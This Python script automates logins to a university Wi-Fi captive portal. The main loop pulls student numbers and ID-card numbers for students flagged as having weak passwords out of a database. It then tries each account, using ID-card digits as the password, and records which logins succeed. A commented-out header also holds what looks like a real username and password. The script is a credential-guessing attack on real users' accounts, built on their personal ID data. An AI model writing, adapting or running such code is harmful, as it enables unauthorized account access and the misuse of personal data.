#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests

from crawNEAU.MysqlTools import select_info, update_info
# 未成功


info_headers = {
    'Accept': '*/*',
    'Host': '202.118.166.254:8080',
    'Accept-Language': "zh-CN,zh;q=0.9",
    'Accept-Encoding': "gzip, deflate",
    'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
    'Connection': "Keep-Alive",
    # 'Cookie': 'SESSIONID=A8FE021ABDCFC63F9D2A9A3C4A0C2E5E; username=wlx13; password=woaibaobao100926; rememberPassword=true; failCounter=0',
    'Referer': 'http://202.118.166.254:8080/zportal/loginForWeb?wlanuserip=65e2a4ba05ec6575ad03e3418ebb130a&wlanacname=2e4904d065a38fffc966d92a12055cb0&ssid=a47edac02cce6f1a7c4a469d98584786&nasip=6b6c7efad16b4121dbe971ff48776465&snmpagentip=&mac=f34980abe16dfc4ff84162d5da846052&t=wireless-v2&url=709db9dc9ce334aa02a9e1ee58ba6fcf3bc3349e947ead368bdd021b808fdbac30c65edaa96b0727&apmac=&nasid=2e4904d065a38fffc966d92a12055cb0&vid=93d867f3296b4c65&port=74e55a05149e86b4&nasportid=5b9da5b08a53a540de3a39287dd9a647ae6dfe96a118f5b1862a0e779a00432c',
    'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; WOW64; Trident/7.0)",
    'X-Requested-With': 'XMLHttpRequest'
}

login_data = {
    'qrCodeId': '请输入编号',
    'username': 'xxxx',
    'pwd': 'xxxxxxx',
    'validCode': '验证码',
    'validCodeFlag': 'false',
    'ssid': 'a47edac02cce6f1a7c4a469d98584786',
    'mac': 'f34980abe16dfc4ff84162d5da846052',
    't': 'wireless-v2',
    'wlanacname': '2e4904d065a38fffc966d92a12055cb0',
    'url': '709db9dc9ce334aa02a9e1ee58ba6fcf3bc3349e947ead368bdd021b808fdbac30c65edaa96b0727',
    'nasip': '6b6c7efad16b4121dbe971ff48776465',
    'wlanuserip': '65e2a4ba05ec6575ad03e3418ebb130a'
}
logout_data = {
    'userName': 'xxxx',
    'userIp': '10.4.111.151',
    'deviceIp': '202.118.161.100',
    'service.id':'',
    'autoLoginFlag': 'false',
    'userMac': '1cbb5af0217',
    'operationType':'',
    'isMacFastAuth': 'false'
}


def login_wifi():
    url = "http://202.118.166.254:8080/zportal/login/do"
    resp = requests.post(url, headers=info_headers, data=login_data)
    if (resp.status_code == 200):
        print("登录", resp.text)
        return True
    else:
        return False


def logout_wifi():
    url = "http://202.118.166.254:8080/zportal/logout"
    resp = requests.post(url, headers=info_headers, data=logout_data)
    print("退出  ",resp.text)


if __name__ == '__main__':
    table = " s_2018"
    get_sql = "select s_no, s_id_card from " + table + " where s_weak_pass = 1 ;"
    db_stus = select_info(get_sql)
    success = 0
    logout_wifi()
    for i, db_st in enumerate(db_stus):
        # print("\n\n抓取第 " + str(i + 1) + " 个， 剩余" + str(db_nos.__len__() - 1 - i) + "， 成功 " + str(success))
        login_data['username']=str(db_st)[2:11]
        logout_data['username']=str(db_st)[2:11]
        login_data['pwd']=str(db_st)[25:33]
        logout_wifi()
        if login_wifi():
            print("成功")
            # up_sql = "update " + table + "set s_wifi = 1 where s_no = " + str(db_st)[2:11] + ";"
            # update_info(up_sql)
            logout_wifi()
